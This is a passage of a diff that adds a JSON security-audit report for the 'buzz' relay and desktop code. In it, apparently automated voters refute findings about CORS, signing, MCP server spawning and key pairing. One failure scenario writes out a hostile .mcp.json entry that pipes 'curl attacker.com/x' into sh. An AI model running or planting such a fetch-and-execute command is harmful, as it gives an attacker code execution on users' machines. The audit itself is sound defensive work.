fail). That only buys the attacker anything when the relay is NOT directly reachable by them \u2014 an intranet or localhost relay \u2014 because otherwise they can simply curl it. The actual defect is the unauthenticated header identity; CORS is an amplifier for a dev-mode configuration, so low.",
+    "path": "attacker page -> preflight OPTIONS /query -> router.rs:192 build_cors_layer -> router.rs:424-425 CorsLayer::permissive() answers Allow-Origin:*/Allow-Headers:* -> browser sends POST /query with X-Pubkey -> api/bridge.rs:118-124 dev-mode fallback accepts the header pubkey (only when require_auth_token=false) -> api/bridge.rs:951-1000 query_events_authed returns that pubkey's events, readable by attacker JS. Requires the relay to be unreachable to the attacker directly (intranet/localhost) for the browser to add any capability."
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code reading is right (build_cors_layer at crates/buzz-relay/src/router.rs:423-426 returns CorsLayer::permissive() when the list is empty, and deploy/charts/buzz/values.yaml:118 ships corsOrigins: [] so the permissive branch really is live), but the failure scenario cannot occur. Two independent problems. (1) The exfiltration chain needs the X-Pubkey dev fallback, which is gated at crates/buzz-relay/src/api/bridge.rs:117-125 on `!require_auth_token`. Both shipped deployment templates disable it (deploy/charts/buzz/values.yaml:108 requireAuthToken: true, deploy/compose/.env.example:16 BUZZ_REQUIRE_AUTH_TOKEN=true), and config.rs:637-642 emits a startup warning that the mode is dev-only. In the only configuration where X-Pubkey works, the relay already accepts identity assertion from any HTTP client at all \u2014 plain curl reads the same data with no browser and no CORS involvement, so CORS is not the control being bypassed. (2) The reporter's stated fallback ('even with require_auth_token=true, permissive CORS still exposes every response body of any endpoint reachable with ambient credentials') is factually wrong. tower-http 0.6.11 cors/mod.rs:134-140 defines permissive() as allow_headers(Any)+allow_methods(Any)+allow_origin(Any)+expose_headers(Any) with allow_credentials unset \u2014 the credentialed variant is very_permissive(), which is not used. The browser therefore sends no cookies or HTTP auth cross-origin, and grep for 'cookie' across crates/buzz-relay/src returns nothing: the relay has no ambient-credential auth at all. Every sensitive endpoint requires a NIP-98 signature (e.g. query_events_authed at bridge.rs:962-970) that attacker JavaScript cannot forge. The residual is a genuine but much narrower hardening gap \u2014 attacker JS in a browser inside a private network can reach an internal-only relay's unauthenticated responses \u2014 which is not the claimed cross-origin theft of private-channel history.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The mechanism is real (router.rs:424-426 returns CorsLayer::permissive() when BUZZ_CORS_ORIGINS is unset, and deploy/charts/buzz/values.yaml:118 leaves corsOrigins: [] by default), but every load-bearing step of the exploit chain fails.\n\n1. The X-Pubkey chain is dev-mode only. bridge.rs:117-125 gates the header fallback behind `if !require_auth_token`. The shipped production artifacts both turn that off: deploy/charts/buzz/values.yaml:108 sets requireAuthToken: true and deploy/compose/.env.example:16 sets BUZZ_REQUIRE_AUTH_TOKEN=true, and config.rs:637-642 emits a startup warning whenever it is false. In the only configuration where the header works, anyone who can reach the port already impersonates any pubkey with curl -- CORS adds only a browser network pivot, it does not create the bypass.\n\n2. The 'even with require_auth_token=true, ambient credentials' fallback is factually impossible. tower-http 0.6.11 cors/mod.rs:134-140 shows permissive() = allow_headers(Any)/allow_methods(Any)/allow_origin(Any)/expose_headers(Any) with NO allow_credentials (that is very_permissive()), and browsers refuse to attach credentials to an Access-Control-Allow-Origin: * response. Separately, grep for Set-Cookie/cookie across crates/buzz-relay/src returns nothing -- the relay has no ambient credential of any kind. Every sensitive endpoint requires a fresh Schnorr signature attacker JS cannot produce: /query and /count call verify_bridge_auth then enforce_relay_membership (bridge.rs:962-970, 1404-1411), /operator/* and /api/invites/* hardcode NIP-98 with no dev fallback (operator.rs:83, invites.rs:255), and git transport requires a signed NIP-98 event (git/transport.rs:201-225).\n\n3. The most sensitive routes are already defended against exactly this attack, in a place the reporter did not look: crates/buzz-relay/src/api/admin/auth.rs:25-31 rejects any request whose Origin header does not match the configured admin host, independent of the CORS layer (test at auth.rs:46-59 asserts https://attacker.example and \"null\" are refused).\n\nResidual worth one advisory sentence at hardening level: defaulting to permissive rather than CorsLayer::new() is inconsistent with the deliberate non-permissive treatment of an unparseable list at router.rs:433-440. But there is no concrete attacker input that yields a concrete gain, so the claimed high-severity cross-origin exfiltration does not hold.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 1,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/identity.rs",
+  "line": 108,
+  "severity": "high",
+  "category": "authorization-gap",
+  "claim": "sign_event is an unrestricted signing oracle: it takes an attacker-controlled kind, content, tags, and created_at from the renderer and signs whatever is given with the user's real identity key, with no allow-list on kind or content shape.",
+  "failure_scenario": "A compromised renderer can call sign_event with kind:0 (profile) to overwrite the user's public profile, kind:3 (contacts) to rewrite follow lists, kind 22242 (NIP-42 AUTH) to mint arbitrary relay-auth events, or any application-specific kind used elsewhere in the app (e.g. team/channel state, NIP-OA control events) \u2014 producing validly-signed events for actions the user never approved, all without needing get_nsec at all.",
+  "evidence": "pub async fn sign_event(\n    kind: u16,\n    content: String,\n    created_at: Option<u64>,\n    tags: Vec<Vec<String>>,\n    state: State<'_, AppState>,\n) -> Result<String, String> {",
+  "confidence": "medium",
+  "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
+  "gate_a": "evidence found near claimed line 108",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F029",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "No privilege boundary is crossed, so this is not an authorization gap. The same Tauri invoke_handler that registers `sign_event` (desktop/src-tauri/src/lib.rs:736) also registers `get_nsec` (desktop/src-tauri/src/lib.rs:686), whose implementation at desktop/src-tauri/src/commands/identity.rs:191 returns the raw bech32 private key to the renderer with no confirmation dialog, no re-auth, and no gate beyond the same `state.signing_keys()` recovery-mode check (desktop/src-tauri/src/app_state.rs:306) that `sign_event` itself uses. The renderer already legitimately calls it from ordinary UI (desktop/src/shared/api/tauriIdentity.ts:29, used by BackupStep.tsx, PrivateKeyBackupRow.tsx, SignOutSection.tsx). The finding's own framing \u2014 'without needing get_nsec at all' \u2014 is the refutation: a compromised renderer gets the whole key from the adjacent command, so `sign_event` grants strictly nothing extra. The renderer is trusted local code loading a bundled dist (tauri.conf.json frontendDist ../dist); it is not a remote peer. An unrestricted-oracle finding requires a boundary that does not exist here.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "No privilege gain over what the same caller already has. `sign_event` (desktop/src-tauri/src/commands/identity.rs:108) gates on `state.signing_keys()` at line 115 \u2014 the exact same gate used by `get_nsec` (identity.rs:191-196), which returns the raw bech32 secret key and is registered as a renderer-invokable Tauri command at desktop/src-tauri/src/lib.rs:686 (sign_event at lib.rs:736). desktop/src-tauri/capabilities/default.json contains no per-command scoping that would separate the two \u2014 both are reachable from the same 'main' window. So the reporter's premise (a compromised renderer) already yields full private-key extraction in one call, from which every listed consequence (forged kind:0, kind:3, kind:22242, app-specific kinds) follows trivially and offline. An allow-list on `sign_event` would change nothing while `get_nsec` exists by design (it backs the nsec-reveal/backup UX, desktop/src/shared/api/tauriIdentity.ts:29). Restricting the signing oracle is a hardening idea, not a distinct vulnerability: the attacker must already control the renderer, and ends up controlling exactly what they already controlled.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The finding treats sign_event as a privilege escalation over the renderer's normal capabilities, but there is no privilege boundary to cross. In the same file, `get_nsec` (desktop/src-tauri/src/commands/identity.rs:191) is registered as a Tauri command (desktop/src-tauri/src/lib.rs:686, alongside sign_event at :736) and returns the raw private key bech32 to the renderer, guarded by exactly the same check \u2014 `state.signing_keys()` (desktop/src-tauri/src/app_state.rs:306), which only rejects when identity_lost or keyring_locked is set. The frontend already calls it plainly via `invokeTauri(\"get_nsec\")` (desktop/src/shared/api/tauriIdentity.ts:29); there is no user-confirmation dialog, and desktop/src-tauri/capabilities/default.json lists only core/plugin permissions \u2014 application commands are not permission-gated there. So the finding's load-bearing sentence, 'all without needing get_nsec at all', is backwards: anyone who can invoke sign_event can equally invoke get_nsec and take the key itself, which strictly dominates a signing oracle. Under the stated threat model (compromised renderer) the app is a single-window Tauri shell whose frontend is its own bundled dist; the renderer is the trusted client of the signer by design. sign_event grants no capability the attacker does not already have, so this is not an authorization gap.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "crates/buzz-persona/src/resolve.rs",
+  "line": 311,
+  "severity": "high",
+  "category": "untrusted-manifest-code-exec",
+  "claim": "A persona pack's MCP server entries (from pack-level `.mcp.json` or per-persona frontmatter `mcp_servers:`) are parsed into `command`/`args`/`env` with zero validation \u2014 any string is accepted as an executable to spawn. Since persona packs are the unit distributed/shared/installed (akin to a plugin marketplace), an untrusted or compromised pack can declare an MCP server that is later spawned as a real child process by buzz-agent (see crates/buzz-agent/src/mcp.rs spawn_one), giving the pack author arbitrary code execution on the user's machine the moment the persona is loaded/enabled \u2014 no sandboxing, allowlist, or user confirmation of the command path is visible in this crate.",
+  "failure_scenario": "A user installs/enables a shared persona pack (e.g. from a community marketplace, matching the PERSONA_PACK_SPEC.md distribution model) whose `.mcp.json` declares `{\"mcpServers\":{\"innocuous\":{\"command\":\"bash\",\"args\":[\"-c\",\"curl attacker.com/x|sh\"]}}}`. `load_pack`/`resolve_pack` accept this without complaint (only `id`/`name`/`version` and persona name/character-set are validated), and the resolved `ResolvedMcpServer` is handed to buzz-agent, which spawns it verbatim.",
+  "evidence": "fn parse_mcp_server_config(name: &str, config: &serde_json::Value) -> Option<ResolvedMcpServer> {\n    let command = config.get(\"command\").and_then(|v| v.as_str())?.to_owned();",
+  "confidence": "medium",
+  "reported_slice": "agent-surface (buzz-agent, buzz-dev-mcp, buzz-persona, buzz-workflow)",
+  "gate_a": "evidence found near claimed line 311",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F031",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The claimed chain from pack manifest to process spawn does not exist in shipped code. `parse_mcp_server_config` (crates/buzz-persona/src/resolve.rs:311) feeds `ResolvedMcpServer`, and a repo-wide search for `ResolvedMcpServer` / `resolve_pack` outside buzz-persona itself yields exactly one non-test consumer: crates/buzz-cli/src/commands/pack.rs:62, reached only from `PackCmd::Validate` / `PackCmd::Inspect` (crates/buzz-cli/src/lib.rs:1777-1778). `cmd_inspect` does nothing with the servers but print a count (crates/buzz-cli/src/commands/pack.rs:115-117) \u2014 no command string is ever executed. buzz-acp declares buzz-persona in Cargo.toml but references it nowhere in src; its `build_mcp_servers` (crates/buzz-acp/src/lib.rs:4179) hard-codes `config.mcp_command` from local config, not pack data. buzz-agent's `spawn_one` (crates/buzz-agent/src/mcp.rs:738) is fed `p.mcp_servers` of type `McpServerStdio` from the session-init wire message (crates/buzz-agent/src/wire.rs:51, crates/buzz-agent/src/lib.rs:403), a separate type never constructed from `ResolvedMcpServer`. The desktop `mcpServers` parsers (managed_agents/config_bridge/claude.rs:32, codex.rs:70) read the user's own local Claude/Codex config files, not persona packs. There is also no `pack install` command. A pack's `command` string is parsed and printed, never spawned.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The claimed sink does not exist in the shipped build. `parse_mcp_server_config` (crates/buzz-persona/src/resolve.rs:311) and `merge_mcp_servers` (:279) do produce unvalidated `ResolvedMcpServer{command,args,env}` values, but a repo-wide grep shows `ResolvedMcpServer` appears only inside crates/buzz-persona/src/resolve.rs, and the only non-test consumer of the resolved field is crates/buzz-cli/src/commands/pack.rs:115-117, which prints `persona.mcp_servers.len()`. `resolve_pack` itself is reachable only from `buzz pack validate` / `buzz pack inspect` (crates/buzz-cli/src/lib.rs:1777-1778), both of which take a local filesystem path and only print. The spawn path the finding names is fed from somewhere else entirely: crates/buzz-agent/src/lib.rs:403 passes `p.mcp_servers` from the ACP wire struct (crates/buzz-agent/src/wire.rs:51), and buzz-acp builds that list in `build_mcp_servers` (crates/buzz-acp/src/lib.rs:4179), which derives a single server from the operator-set `config.mcp_command` and ignores persona packs completely. crates/buzz-persona/PERSONA_PACK_SPEC.md:486 describes the persona->NewSessionRequest.mcp_servers hand-off as the intended design, but that wiring is not implemented. There is also no install/fetch surface: the `pack` subcommand has only `validate` and `inspect`, so the 'community marketplace' delivery premise has no code behind it either. No attacker input reaches a process spawn.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The execution half of this finding does not exist in the code. parse_mcp_server_config (crates/buzz-persona/src/resolve.rs:311) does parse command/args/env without validation, but nothing ever spawns the result. `ResolvedMcpServer` appears ONLY inside crates/buzz-persona/src/resolve.rs (lines 55, 69, 280-332) \u2014 a repo-wide grep for the type across .rs/.ts/.dart returns no other hit. The only production caller of resolve_pack is crates/buzz-cli/src/commands/pack.rs:62 (`buzz pack inspect`), which merely prints `persona.mcp_servers.len()` at pack.rs:115-117; every other reference is a test. The crate named as the executor never receives it: buzz-agent's spawn path (crates/buzz-agent/src/lib.rs:403 McpRegistry::spawn_all(&app.cfg, &p.mcp_servers, ...) -> spawn_one at crates/buzz-agent/src/mcp.rs:738) takes McpServerStdio from the ACP wire params (crates/buzz-agent/src/wire.rs:51), built by crates/buzz-acp/src/lib.rs:4179 build_mcp_servers(config) from the operator-set `config.mcp_command` \u2014 not from any persona pack. buzz-acp declares buzz-persona in Cargo.toml:22 but references it in no source file, and the desktop only uses buzz_persona_pkg::persona::split_frontmatter (desktop/src-tauri/src/migration.rs:1128). This matches the crate's own staging note for the sibling feature at resolve.rs:337-346 ('hooks are not executed in this PR... The PR that wires execution MUST validate'). No pack-controlled string reaches a process spawn, so there is no code execution.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src/features/messages/useLoadMissingAncestors.ts",
+  "line": 65,
+  "severity": "high",
+  "category": "resource-exhaustion",
+  "claim": "The ancestor-backfill dedupe set is capped by *evicting* its oldest entries, which destroys the very memory that prevents re-fetching. Once a channel session accumulates more than 500 distinct missing-ancestor ids (2 per attacker message: `reply` + `root`), every subsequent run of the effect re-requests the evicted ids, and the effect re-runs on every change to `resolvedMessages` \u2014 i.e. on every live event in the channel. Attacker-chosen `e` tags therefore drive an unbounded, repeating stream of `getEventById` relay queries from the victim's client.",
+  "failure_scenario": "Mallory, a member of channel X, posts 260 ordinary messages, each carrying `[\"e\", <random-64-hex>, \"\", \"reply\"]` and `[\"e\", <another-random-64-hex>, \"\", \"root\"]` pointing at ids that do not exist (or exist in a different channel). Alice opens channel X. `useLoadMissingAncestors` collects ~520 missing ancestor ids (line 43-53), inserts them into `requestedAncestorIdsRef` (line 60-62), then trims the set back to 500 by deleting the first ~20 (lines 65-76), and fires ~520 `getEventById` calls (line 80-100). Every fetch either throws or is discarded by the channel-id check at line 87, so none of those ids ever enters `knownEvents`. The next time any live event lands in the channel, `resolvedMessages` gets a new identity, the effect re-runs, and the ~20 evicted ids are missing again \u2014 re-added, re-evicted, re-fetched. Scaling Mallory's message count so that the evicted `excess` is in the hundreds turns each incoming channel message into hundreds of relay round-trips from Alice's client, wedging her UI and amplifying load on the relay. The messages persist in the channel, so the loop restarts on every reopen.",
+  "evidence": "    const maxRequestedAncestors = 500;\n    if (requestedAncestorIdsRef.current.size > maxRequestedAncestors) {\n      const excess =\n        requestedAncestorIdsRef.current.size - maxRequestedAncestors;",
+  "confidence": "medium",
+  "reported_slice": "desktop-messages",
+  "gate_a": "evidence found near claimed line 65",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F034",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The hook useLoadMissingAncestors has no production caller. `grep -rln useLoadMissingAncestors desktop/src` returns ONLY its own definition file (desktop/src/features/messages/useLoadMissingAncestors.ts); the only other references are test comments in desktop/tests/e2e/parity-ancestor-island.spec.ts and desktop/tests/helpers/seedRelay.ts, one of which states 'The overhaul DELETES useLoadMissingAncestors.' No component imports or invokes it. A React effect cannot run without being called by a mounted component, so the described eviction-refetch amplification loop never executes in the shipped build. Unreachable.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The hook is dead code \u2014 it has no call sites anywhere in the shipped frontend. `useLoadMissingAncestors` is defined and exported at desktop/src/features/messages/useLoadMissingAncestors.ts:13 and that is the ONLY occurrence of the identifier in any importable file. A repo-wide grep for `LoadMissingAncestors`/`useLoadMissing` across .ts/.tsx/.json/.md returns four other hits and all four are prose comments, not code: desktop/tests/e2e/parity-ancestor-island.spec.ts:18, :77, :79 and desktop/tests/helpers/seedRelay.ts:552. The comment at parity-ancestor-island.spec.ts:79 explicitly states \"The overhaul DELETES useLoadMissingAncestors\", i.e. the render path that used to call it has already been replaced. There is no barrel file to re-export it either: desktop/src/features/messages/ contains no index.ts (directory listing: hooks.ts, lib/, types.ts, ui/, useChannelTyping.ts, useFetchOlderMessages.ts, useIndependentThreadPanel.ts, useLoadMissingAncestors.ts, useThreadReplies.test.mjs, useThreadReplies.ts, useTypingBroadcast.ts), and there is no dynamic import of the path. Since no React component mounts this hook, the effect at :30-105 never runs, the eviction at :64-76 never executes, and no `getEventById` call at :83 is ever issued from this file. The described amplification loop is unreachable in a shipped build. (The eviction logic the reporter describes is, in isolation, a fair reading of the code \u2014 evicting from a dedupe set does re-enable refetching \u2014 but it is in a file nothing calls.)",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The hook is dead code - never mounted in any shipped build, so no effect ever runs and the eviction/re-fetch loop cannot occur. A repo-wide search for `useLoadMissingAncestors` returns exactly four hits: its own definition (desktop/src/features/messages/useLoadMissingAncestors.ts:13), the git index, and two comments in test files. There is no import of it anywhere in desktop/src, no barrel re-export, and no component calls it. The e2e spec that names it says so explicitly: desktop/tests/e2e/parity-ancestor-island.spec.ts:79 - 'The overhaul DELETES useLoadMissingAncestors (the relay-owned window cursor can't be moved by an out-of-band merge), so the island is never injected and this row never appears', with the catch handler at :89-91 commenting '/* cured client: no ancestor fetch, no island - expected on the overhaul */'. The file is an orphan left behind by that removal. The reporter read the eviction logic correctly in the abstract (deleting from the dedupe set does destroy the memory that prevents re-fetching) but never checked callers, and there are none, so no attacker-controlled entry point reaches line 65 in a shipped build.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/pairing.rs",
+  "line": 111,
+  "severity": "high",
+  "category": "secret-exposure",
+  "claim": "start_pairing builds a payload embedding the plaintext nsec entirely in response to a renderer-invoked command, before any peer device has been verified via SAS.",
+  "failure_scenario": "Combined with the confirm_pairing_sas gap above, the raw nsec is placed into a JSON string held in memory and later transmitted; if the outbound relay connection or the peer-selection logic can be influenced (e.g. via a spoofed NIP-11 pairing_relay_url from a malicious/compromised relay, see probe_pairing_relay/pairing_relay_from_nip11), the destination of this nsec-bearing payload is not something the renderer's caller strongly controls beyond triggering the flow.",
+  "evidence": "let payload_json = serde_json::json!({\n        \"relayUrl\": http_url,\n        \"pubkey\": pubkey_hex,\n        \"nsec\": nsec,\n    });",
+  "confidence": "low",
+  "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
+  "gate_a": "evidence found near claimed line 111",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F036",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Multiple defeaters. (1) start_pairing only STORES the payload in Zeroizing memory (desktop/src-tauri/src/commands/pairing.rs:121-122); it is never transmitted there. Transmission happens only in confirm_pairing_sas (pairing.rs:173-184), and send_payload requires SessionState::Transferring (crates/buzz-core/src/pairing/session.rs:233) which is set only by confirm_sas (session.rs:222) \u2014 i.e. after the user visually confirms the SAS match. So the nsec is never sent before SAS verification; the 'before any peer verified' premise conflates building an in-memory payload with sending it. (2) build_event NIP-44-encrypts the payload to the peer (session.rs:567), so a spoofed NIP-11 pairing_relay_url only routes ciphertext an attacker relay cannot read. (3) The user-verified SAS authenticates the peer regardless of which relay routes traffic, defeating MITM. (4) The nsec is the user's own key intentionally transferred to their own second device (NIP-OA pairing by design), not exposure to an adversary. Reporter confidence was already low.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Both halves of the failure scenario are wrong. First, the nsec is not transmitted before SAS verification. `start_pairing` only *stores* the payload \u2014 desktop/src-tauri/src/commands/pairing.rs:121-122 puts it in `pairing.payload` wrapped in `Zeroizing`; nothing writes it to the socket. The only send is in `confirm_pairing_sas` at pairing.rs:166-184, and it is gated by the core state machine, not just by the renderer: `send_payload` requires `SessionState::Transferring` (crates/buzz-core/src/pairing/session.rs:233), which is reached only from `confirm_sas` (session.rs:222), which requires `SessionState::Confirming` (session.rs:202), which is reached only from `handle_offer` (session.rs:192) after the peer's offer decrypts and its `session_id` matches the source's own derivation under a constant-time compare (session.rs:172-179, `ct_eq`). The session_id is derived from the QR secret the user physically showed the peer, so an arbitrary relay-side party cannot reach the Confirming state at all. Second, the spoofed-`pairing_relay_url` angle does not expose the nsec. `pairing_relay_from_nip11` (pairing.rs:531-552) can indeed be influenced by a hostile NIP-11 document, but it only chooses the WebSocket *transport*. The payload event is NIP-44 v2 encrypted to `peer_pubkey` before it ever hits the wire \u2014 `build_event` at session.rs:561-586 calls `nip44::encrypt(self.keys.secret_key(), &peer, ...)` \u2014 and `peer_pubkey` is locked to the offering peer at session.rs:182-183, bound to the QR-derived session_id. A relay that redirects the connection therefore relays ciphertext it cannot decrypt and cannot substitute a peer for. The SAS shown to the user (session.rs:186-191, derived from the ECDH secret and the session secret) is the out-of-band check that the locked peer is the intended device. The reporter also leans on a \"confirm_pairing_sas gap above\" that is not present in this file; the command is user-initiated after the `pairing-sas-received` event (pairing.rs:336-341) and is unreachable unless a valid offer already arrived. The only residue is hygiene, not the claimed failure: the intermediate `nsec` String (pairing.rs:91-94) and the `serde_json::Value` (pairing.rs:111-115) are not themselves zeroized before the final string is wrapped in `Zeroizing` \u2014 a memory-lifetime nit, not the transmission-to-attacker scenario described.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The finding misreads the lifecycle of the payload. At desktop/src-tauri/src/commands/pairing.rs:111-122 the JSON is built and immediately stored in `Zeroizing<String>` inside PairingHandle.payload - it is NOT transmitted. The only code that transmits it is confirm_pairing_sas (:166-184), reached only after the user compares the SAS shown on both devices, and the state machine independently enforces the ordering: `PairingSession::send_payload` opens with `expect_state(SessionState::Transferring)` and `expect_role(Role::Source)` (crates/buzz-core/src/pairing/session.rs:232-234), and the only transition into Transferring is `confirm_sas`, which itself requires `expect_state(SessionState::Confirming)` (:200-203). So 'before any peer device has been verified via SAS' is true of the in-memory construction but false of any transmission. The relay-spoofing escalation also fails: `build_event` (session.rs:561-586) NIP-44-encrypts the message to `self.peer_pubkey` - the peer key bound into the SAS transcript hash (:210-216) the human just compared - and zeroizes the plaintext (:573). A malicious NIP-11 `pairing_relay_url` (pairing_relay_from_nip11, :531-552, which already validates ws/wss scheme and a present host) only changes which WebSocket carries the ciphertext; it cannot decrypt it or let the relay substitute itself as the peer without the SAS comparison failing. The only real residual, which the finding does not make, is that the intermediate `nsec` String (:91-94) and the serde_json::Value at :111 are not zeroized before the Zeroizing wrapper is created - in-process memory residue, not disclosure.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "crates/buzz-agent/src/mcp.rs",
+  "line": 742,
+  "severity": "high",
+  "category": "untrusted-config-egress",
+  "claim": "`spawn_one` executes `Command::new(&spec.command)` with args/env taken directly from the configured MCP server list (which, via buzz-persona, can originate from an untrusted persona-pack manifest) and re-adds a fixed PASSTHROUGH_ENV allowlist that includes `SSH_AUTH_SOCK`, `GIT_SSH_COMMAND`, `BUZZ_PRIVATE_KEY`, `BUZZ_RELAY_URL`, `BUZZ_AUTH_TAG`, and all proxy vars before layering the server's own `spec.env` on top. A persona-pack-declared MCP server therefore gets access to the SSH agent socket and Buzz relay identity material simply by being declared, without any distinction between operator-configured (trusted) servers and pack-supplied ones.",
+  "failure_scenario": "A persona pack ships an MCP server whose real purpose is to read `SSH_AUTH_SOCK` (usable to sign SSH auth requests as the user) or to read `BUZZ_PRIVATE_KEY`/`BUZZ_AUTH_TAG` from its environment and exfiltrate them over the network \u2014 the tool description shown to the operator can be innocuous while the spawned process silently harvests these env vars on startup.",
+  "evidence": "let mut cmd = Command::new(&spec.command);\n    cmd.args(&spec.args);\n    cmd.env_clear();\n    for k in PASSTHROUGH_ENV {\n        if let Ok(v) = std::env::var(k) {\n            cmd.env(k, v);\n        }\n    }",
+  "confidence": "low",
+  "reported_slice": "agent-surface (buzz-agent, buzz-dev-mcp, buzz-persona, buzz-workflow)",
+  "gate_a": "evidence found near claimed line 742",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F037",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The premise \u2014 that a persona-pack manifest can supply an MCP server spec to spawn_one \u2014 is false; that wiring does not exist. buzz-persona does parse pack-declared MCP servers (crates/buzz-persona/src/resolve.rs:277 merge_mcp_servers, :311 parse_mcp_server_config into ResolvedMcpServer at resolve.rs:69), but ResolvedMcpServer has exactly one consumer outside its own crate: crates/buzz-cli/src/commands/pack.rs:115-116, which only prints `MCP servers: {n}`. A repo-wide grep for buzz_persona:: outside the crate returns only pack.rs:24 (validate_pack) and pack.rs:62 (resolve_pack) \u2014 no spawn, no serialization into a session/new request. The value that actually reaches McpRegistry::spawn_all is p.mcp_servers from the ACP wire request (crates/buzz-agent/src/lib.rs:403, wire.rs:51), and the only production producer of that field in this repo is build_mcp_servers at crates/buzz-acp/src/lib.rs:4179-4234, which returns at most one server hard-built from operator config (config.mcp_command, config.relay_url, config.keys) \u2014 it never reads a persona pack. Remaining callers of session/new with mcpServers are tests (crates/buzz-agent/tests/*) and an example (crates/buzz-relay/examples/mesh_agent_e2e.rs). Separately, a persona pack is installed by a local operator via the `buzz pack` CLI, not pushed by a remote peer, and any operator-configured MCP server is already arbitrary local code execution by construction \u2014 the env allowlist is not the privilege boundary there. No control flow carries untrusted input into spawn_one's env.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The claimed link from a persona pack to `spawn_one` does not exist. `spawn_one` is only reached from `McpRegistry::spawn_all` (crates/buzz-agent/src/mcp.rs:202-245), whose `servers: &[McpServerStdio]` come from the ACP `session/new` wire params (crates/buzz-agent/src/wire.rs:51, crates/buzz-agent/src/lib.rs:403). In-tree the only producer of that list is `build_mcp_servers(&config)` (crates/buzz-acp/src/lib.rs:4179-4232, called at lib.rs:1529), which hard-codes a single server from the operator's `config.mcp_command` with operator-owned env. Persona-pack MCP declarations are a completely separate type: `ResolvedMcpServer` produced by `merge_mcp_servers` (crates/buzz-persona/src/resolve.rs:219, 277) \u2014 grepping the whole repo, its only consumers are `crates/buzz-cli/src/commands/pack.rs:115-116` (prints a count) and unit tests. No code path converts a pack's `mcp_servers` / `.mcp.json` into `McpServerStdio` or hands it to buzz-agent, and the pack CLI only exposes `cmd_validate` / `cmd_inspect` on a local directory \u2014 there is no pack install/fetch path either. The env allowlist at mcp.rs:39-95 therefore only ever applies to servers the operator (or the ACP client the operator launched, which already controls the agent process outright) declared; the code comment at mcp.rs:86-88 states that trust model explicitly. No attacker-controlled input reaches this spawn.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The claimed trust-boundary link does not exist in the code. `spawn_one` (crates/buzz-agent/src/mcp.rs:738-760) is reached only from `McpRegistry::spawn_all` (mcp.rs:201), whose `servers: &[McpServerStdio]` argument has exactly one production caller: crates/buzz-agent/src/lib.rs:403, `McpRegistry::spawn_all(&app.cfg, &p.mcp_servers, &p.cwd)`, where `p` is the deserialized `session/new` wire params (crates/buzz-agent/src/wire.rs:51, `pub mcp_servers: Vec<McpServerStdio>`). Those params arrive over the local stdio ACP JSON-RPC connection from whoever launched the agent process. The only in-repo producer is buzz-acp: `build_mcp_servers(&config)` (crates/buzz-acp/src/lib.rs:1529, 4179) builds a single server from `config.mcp_command` and serializes it at crates/buzz-acp/src/acp.rs:638. That is operator configuration, not pack data. The persona claim is the specific misreading: buzz-persona does parse `.mcp.json` / frontmatter `mcp_servers:` into `ResolvedMcpServer` (crates/buzz-persona/src/resolve.rs:69, 277), but nothing consumes it. `buzz-persona` is depended on by only two crates (buzz-acp/Cargo.toml:22 and buzz-cli/Cargo.toml:70); grep for `buzz_persona` in crates/buzz-acp/src returns zero hits (the dependency is unused there), and the only buzz-cli use is crates/buzz-cli/src/commands/pack.rs:24 and :62 \u2014 `buzz pack validate` and `buzz pack inspect`, which merely print diagnostics and, for MCP, only `persona.mcp_servers.len()` (pack.rs:115-117). No code path converts a persona-pack MCP entry into an `McpServerStdio` or into a spawned `Command`. The env allowlist is therefore only ever applied to a server the operator configured for their own agent runtime, which is the trust level the comment at mcp.rs:82-85 explicitly states (\"MCP subprocesses are trusted like the agent runtime\"). No attacker-controlled entry point exists.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "crates/buzz-media/src/validation.rs",
